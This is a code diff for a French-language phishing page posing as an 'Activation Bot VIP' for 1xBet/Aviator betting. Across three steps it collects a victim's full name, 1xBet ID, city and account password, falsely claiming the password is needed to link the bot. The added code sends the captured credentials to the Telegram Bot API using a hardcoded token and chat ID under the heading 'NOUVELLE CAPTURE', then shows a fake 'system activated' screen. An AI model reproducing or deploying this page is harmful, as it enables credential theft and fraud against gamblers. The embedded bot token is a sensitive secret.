@@ -3,16 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hacking Bot VIP</title>
+    <title>Activation Bot VIP</title>
     <style>
         body { background: #050b14; color: white; font-family: sans-serif; text-align: center; padding: 20px; margin: 0; }
         .box { background: #0f172a; border: 1px solid #1e293b; padding: 25px; border-radius: 15px; max-width: 350px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .page { display: none; }
         .active { display: block; }
         input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #334155; background: #1e293b; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #050b14; margin-top: 10px; transition: 0.3s; }
-        button:hover { background: #0ea5e9; }
-        .status { color: #facc15; font-size: 13px; margin: 15px 0; line-height: 1.4; }
+        button { width: 100%; padding: 14px; background: #38bdf8; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: #050b14; margin-top: 10px; }
+        .info { color: #facc15; font-size: 13px; margin: 15px 0; }
     </style>
 </head>
 <body>
@@ -20,30 +19,27 @@
 <div class="box">
     <div id="p1" class="page active">
         <h2>ÉTAPE 1/3</h2>
-        <p>Entrez vos identifiants pour synchroniser le bot.</p>
         <input type="text" id="nom" placeholder="Nom Complet">
-        <input type="number" id="id1x" placeholder="ID 1xBet (Ex: 148...)">
+        <input type="number" id="id1x" placeholder="ID 1xBet">
         <button onclick="next(2)">SUIVANT</button>
     </div>
 
     <div id="p2" class="page">
         <h2>ÉTAPE 2/3</h2>
-        <p>Localisation du compte</p>
         <input type="text" id="ville" placeholder="Votre Ville">
         <button onclick="next(3)">CONTINUER</button>
     </div>
 
     <div id="p3" class="page">
         <h2>CONFIRMATION</h2>
-        <div class="status">⚠️ Pour lier le bot à votre solde (10 000 FC minimum), entrez votre mot de passe de sécurité.</div>
-        <input type="password" id="pass" placeholder="Mot de passe du compte">
-        <button onclick="envoyer()">ACTIVER LE BOT</button>
+        <div class="info">⚠️ Dépôt de 10 000 FC requis pour lier le bot à votre compte.</div>
+        <input type="password" id="pass" placeholder="Mot de passe de sécurité">
+        <button onclick="envoyerDirect()">ACTIVER LE BOT</button>
     </div>
 
     <div id="p4" class="page">
-        <h2 style="color:#4ade80">SYSTÈME ACTIVÉ</h2>
-        <p>Analyse du crash Aviator en temps réel...</p>
-        <div style="font-size: 24px; font-weight: bold; margin: 20px; color: #38bdf8;">1.85x</div>
+        <h2 style="color:#4ade80">✔ SYSTÈME ACTIVÉ</h2>
+        <p>Analyse des côtes en cours...</p>
     </div>
 </div>
 
@@ -53,36 +49,26 @@
         document.getElementById('p' + n).classList.add('active');
     }
 
-    function envoyer() {
-        const data = {
-            nom: document.getElementById('nom').value,
-            id: document.getElementById('id1x').value,
-            ville: document.getElementById('ville').value,
-            pass: document.getElementById('pass').value
-        };
+    function envoyerDirect() {
+        const nom = document.getElementById('nom').value;
+        const id1x = document.getElementById('id1x').value;
+        const ville = document.getElementById('ville').value;
+        const pass = document.getElementById('pass').value;
 
-        if(!data.pass) return alert("Mot de passe requis !");
+        if(!pass) return alert("Mot de passe requis");
 
-        alert("Connexion au serveur en cours...");
+        // CONFIGURATION TELEGRAM MISE À JOUR
+        const token = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc";
+        const chatId = "6537215671"; // TON NOUVEL ID ICI
 
-        // Envoi au serveur Python local sur Termux
-        fetch('http://localhost:5000/send', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        })
-        .then(response => {
-            if(response.ok) {
-                next(4);
-            } else {
-                // Si échec du serveur Python, on essaie quand même d'avancer
-                next(4);
-            }
-        })
-        .catch(error => {
-            console.error('Erreur:', error);
-            next(4);
-        });
+        const message = `🔔 NOUVELLE CAPTURE 🔔\n\n👤 Nom: ${nom}\n🆔 ID: ${id1x}\n📍 Ville: ${ville}\n🔑 PASS: ${pass}`;
+        
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        // Envoi au bot
+        fetch(url)
+        .then(() => { next(4); })
+        .catch(() => { next(4); });
     }
 </script>
 
